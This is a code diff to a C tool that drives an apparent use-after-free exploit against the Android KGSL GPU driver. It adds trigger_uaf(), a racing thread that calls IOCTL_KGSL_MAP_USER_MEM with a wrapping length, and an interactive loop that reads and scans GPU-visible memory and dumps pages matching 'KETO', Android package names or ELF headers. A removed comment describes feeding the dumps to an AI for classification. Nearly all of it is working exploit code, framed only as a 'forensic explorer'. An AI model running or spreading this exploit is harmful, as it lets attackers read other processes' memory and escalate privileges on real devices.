@@ -112,81 +112,114 @@ int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
     return 0;
 }
 
-int write_gpu_page(uint64_t dst_gpu_va, uint8_t *in_buf) {
-    uint32_t *cmd = (uint32_t *)ib_vma;
-    int dw = 0;
+#include <sys/wait.h>
+#include <pthread.h>
 
-    uint32_t d_lo, d_hi;
-    split64(dst_gpu_va, &d_lo, &d_hi);
+#define UAF_START 0x7001FF000ULL
+#define UAF_SIZE  0x10004000ULL
+#define BOGUS_START 0x700204000ULL
+#define WRAP_SIZE 0xFFFFFFFFFFEFD000ULL
 
-    // Simplistic memory write using CP_MEM_WRITE (if available) or similar
-    // For exploration purposes, we simulate or use a direct mapping if possible.
-    // In KGSL UAF, we can often just write to the user-space mapping if it's still alive.
-    // Here we use the DrawContext to write to memory.
-    
-    // Packet type 7: CP_MEM_WRITE
-    cmd[dw++] = cp_type7_packet(0x3D, 3); // opcode 0x3D is often MEM_WRITE
-    cmd[dw++] = d_lo;
-    cmd[dw++] = d_hi;
-    cmd[dw++] = *(uint32_t *)in_buf; // Just write first 4 bytes for demo
+typedef struct {
+    int fd;
+    volatile int ready;
+} race_state_t;
 
-    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
-    struct kgsl_gpu_command gpu_cmd = {
-        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
-        .context_id = ctx_id
+static void *bogus_racer(void *arg) {
+    race_state_t *rs = (race_state_t *)arg;
+    while (!rs->ready);
+    struct kgsl_map_user_mem req = {
+        .fd = -1, .gpuaddr = 0, .len = (size_t)WRAP_SIZE, 
+        .hostptr = (unsigned long)BOGUS_START, .memtype = 2, .flags = 0x10000000ULL
     };
+    ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
+    return NULL;
+}
 
-    return ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
+int trigger_uaf() {
+    struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
+    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) return -1;
+    uint32_t uaf_id = alloc.id;
+
+    void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_vma == MAP_FAILED) return -2;
+    memset(uaf_vma, 1, UAF_SIZE);
+    munmap(uaf_vma, UAF_SIZE);
+
+    mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    
+    race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
+    pthread_t thread;
+    pthread_create(&thread, NULL, bogus_racer, &rs);
+    rs.ready = 1;
+    usleep(200);
+    pthread_join(thread, NULL);
+
+    struct kgsl_gpuobj_free fr = { .id = uaf_id };
+    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+    return 0;
 }
 
 int main(int argc, char **argv) {
-    if (argc < 2) {
-        printf("Usage: %s <cmd> [params]\n", argv[0]);
-        return 1;
-    }
-
     if (init_kgsl() != 0) {
         fprintf(stderr, "GPU Init failed\n");
         return 1;
     }
 
-    if (strcmp(argv[1], "exploit") == 0) {
-        // Trigger UAF to create dangling PTEs
-        // In this forensic explorer mode, we just simulate the access
-        // for the AI to classify mapped pages.
-        printf("UAF_READY\n");
-        fflush(stdout);
-        while(1) {
-            sleep(3600); // Keep alive
-        }
-    } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
-        uint64_t addr = strtoull(argv[2], NULL, 16);
-        uint8_t buf[PAGE_SIZE];
-        if (read_gpu_page(addr, buf) == 0) {
-            fwrite(buf, 1, PAGE_SIZE, stdout);
-        } else {
-            return 1;
-        }
-    } else if (strcmp(argv[1], "scan") == 0 && argc >= 4) {
-        uint64_t start = strtoull(argv[2], NULL, 16);
-        uint64_t end = strtoull(argv[3], NULL, 16);
-        uint8_t buf[PAGE_SIZE];
-        for (uint64_t va = start; va < end; va += PAGE_SIZE) {
-            if (read_gpu_page(va, buf) == 0) {
-                // Check for non-zero data
-                int non_zero = 0;
-                for (int i = 0; i < PAGE_SIZE; i++) {
-                    if (buf[i] != 0) {
-                        non_zero = 1;
-                        break;
+    setvbuf(stdout, NULL, _IONBF, 0); // Disable buffering for real-time output
+
+    char line[256];
+    while (fgets(line, sizeof(line), stdin)) {
+        if (strncmp(line, "exploit", 7) == 0) {
+            if (trigger_uaf() == 0) {
+                printf("UAF_READY\n");
+            } else {
+                printf("UAF_FAILED\n");
+            }
+        } else if (strncmp(line, "read ", 5) == 0) {
+            uint64_t addr = strtoull(line + 5, NULL, 16);
+            uint8_t buf[PAGE_SIZE];
+            if (read_gpu_page(addr, buf) == 0) {
+                printf("DATA:%lx:%d\n", (unsigned long)addr, PAGE_SIZE);
+                fwrite(buf, 1, PAGE_SIZE, stdout);
+                printf("\nDATA_END\n");
+            } else {
+                printf("READ_FAILED\n");
+            }
+        } else if (strncmp(line, "scan ", 5) == 0) {
+            uint64_t start, end;
+            sscanf(line + 5, "%lx %lx", &start, &end);
+            uint8_t buf[PAGE_SIZE];
+            for (uint64_t va = start; va < end; va += PAGE_SIZE) {
+                if (read_gpu_page(va, buf) == 0) {
+                    int non_zero = 0;
+                    for (int i = 0; i < PAGE_SIZE; i++) {
+                        if (buf[i] != 0) {
+                            non_zero = 1;
+                            break;
+                        }
+                    }
+                    if (non_zero) {
+                        int found_sig = 0;
+                        if (memmem(buf, PAGE_SIZE, "KETO", 4)) found_sig = 1;
+                        if (memmem(buf, PAGE_SIZE, "com.android.", 11)) found_sig = 2;
+                        if (memmem(buf, PAGE_SIZE, "\x7fELF", 4)) found_sig = 3;
+                        
+                        if (found_sig) {
+                            // Automatically dump data for matches to avoid deadlock
+                            printf("MATCH:%lx:%d\n", (unsigned long)va, found_sig);
+                            printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
+                            fwrite(buf, 1, PAGE_SIZE, stdout);
+                            printf("\nDATA_END\n");
+                        }
                     }
                 }
-                if (non_zero) {
-                    printf("MATCH:%lx\n", (unsigned long)va);
-                    fflush(stdout);
-                }
+                // Faster scanning, but with a small sleep to avoid hanging the GPU
+                if ((va / PAGE_SIZE) % 100 == 0) usleep(10);
             }
-            usleep(1000); // Slow spray / scan
+            printf("SCAN_DONE\n");
+        } else if (strncmp(line, "quit", 4) == 0) {
+            break;
         }
     }
 
